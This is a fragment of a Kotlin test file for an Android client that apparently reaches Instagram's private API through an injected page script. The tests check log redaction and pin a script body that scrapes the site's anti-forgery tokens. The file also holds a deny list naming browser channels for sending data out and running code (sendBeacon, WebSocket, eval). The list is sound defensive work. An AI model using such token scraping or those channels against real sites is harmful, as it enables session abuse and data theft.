    fun theLogShowsTheRedactedSummaryForErrors() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)
        val body = """{"message":"Please wait a few minutes before you try again.","status":"fail","checkpoint_url":"https://www.instagram.com/challenge/AbCd/"}"""
        val pending = call(transport, "api/v1/media/3100000000000000001/info/")
        runCurrent()
        advanceTimeBy(40)
        pages.created.single().post(reply(1, code = 429, body = body))
        pending.await().getOrThrow()

        assertEquals(
            listOf(
                "GET api/v1/media/<n>/info/ -> 429 (40 ms)",
                ErrorReplySummary.of(429, "application/json", body),
            ),
            lines,
        )
        // The summary is the allow-listed one: key names at most, never the URL or any other value from the body.
        assertFalse(lines.any { "AbCd" in it || "instagram.com" in it || "http" in it })
        assertTrue(lines.last().startsWith("<-- 429 reply: status=fail"))
    }

    @Test
    fun theLogNamesWhatHappenedWhenThereIsNoStatus() = runTest {
        val lines = mutableListOf<String>()
        val pages = Pages()
        val transport = transport(pages, log = lines::add)

        val redirected = call(transport, "api/v1/collections/list/")
        runCurrent()
        pages.created.single().post(reply(1, code = 0, contentType = null, body = null, redirected = true))
        redirected.await().getOrThrow()

        val timedOut = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        advanceTimeBy(30_000)
        runCurrent()
        assertIs<InstagramException.Transient>(timedOut.await().exceptionOrNull())

        // A redirect has no status and no body to summarise; a timeout has neither.
        assertEquals(
            listOf(
                "GET api/v1/collections/list/ -> redirect (0 ms)",
                "GET api/v1/feed/saved/posts/ -> timeout (30000 ms)",
            ),
            lines,
        )
    }

    private companion object {
        /** Stands in for ig_fetch.js: the transport only passes it on. */
        const val SCRIPT = "/* ig_fetch stand-in */ window.standIn = 1;"

        /** Where the GraphQL call's body begins in ig_fetch.js. */
        const val GRAPHQL_OPENING = "window.__igGraphQl = function (id, name, docId, variables) {"

        /**
         * The body of `tokens()` in ig_fetch.js, exactly (compared without comments and with white space collapsed): the site's
         * module system first, then the two module records its server renders into the page. The module names and the record
         * shape are the site's, kept here as literals on purpose. Any change to the reader must change this text too.
         */
        const val TOKENS_BODY = """
            var dtsg = null, lsd = null;
            try { dtsg = require('DTSGInitialData').token; } catch (e) {}
            try { lsd = require('LSD').token; } catch (e) {}
            if (!dtsg || !lsd) {
              var html = document.documentElement.innerHTML;
              var d = html.match(new RegExp('"DTSGInitialData",\\[\\],\\{"token":"([^"]+)"'));
              var l = html.match(new RegExp('"LSD",\\[\\],\\{"token":"([^"]+)"'));
              dtsg = dtsg || (d && d[1]);
              lsd = lsd || (l && l[1]);
            }
            return dtsg && lsd ? { dtsg: dtsg, lsd: lsd } : null;
        """

        /**
         * Ways out of the page other than its two fetches and the bridge, logcat (`console`), and ways to run built-up code: none
         * of these words may appear in ig_fetch.js's code. (A list of words the script must not contain, not calls.)
         */
        val BANNED_IN_SCRIPT = listOf(
            "console", "navigator", "sendBeacon", "XMLHttpRequest", "WebSocket", "EventSource", "Image", "Worker", "SharedWorker",
            "localStorage", "indexedDB", "open", "write", "location", "eval", "Function", "importScripts",
        )
    }
}
